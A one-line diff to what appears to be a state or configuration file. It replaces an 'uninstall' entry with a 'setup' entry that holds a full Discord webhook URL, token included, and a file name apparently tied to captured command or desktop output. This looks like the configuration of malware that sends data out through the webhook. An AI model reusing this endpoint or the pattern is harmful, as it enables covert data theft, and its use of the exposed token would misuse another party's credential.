@@ -1,1 +1,1 @@
-uninstall|1790127758
+setup:https://discord.com/api/webhooks/1552133230390411299/Jiu3ObZ9fJjXfPMGmzp7SNo5-jSdEvrEqEU_YAWYFk68kp5XNhz6LrXJSpuQQBRflMpL;cmd-desktop-4j0ijg5.txt|1790127799
